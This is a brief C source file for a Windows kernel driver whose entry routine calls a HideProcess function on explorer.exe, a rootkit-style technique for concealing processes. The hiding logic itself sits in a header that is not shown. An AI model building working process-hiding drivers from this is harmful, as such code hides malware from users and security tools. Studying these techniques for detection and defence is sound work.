#include "main.h"
#include "process.h"

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegPath) 
{


	DbgPrint("DriverEntry\r\n");
	DriverObject->DriverUnload = UnloadDriver;

	HideProcess("explorer.exe");
	return STATUS_SUCCESS;
}

VOID UnloadDriver(PDRIVER_OBJECT  DriverObject)
{
	DbgPrint("UnloadDriver\r\n");
}
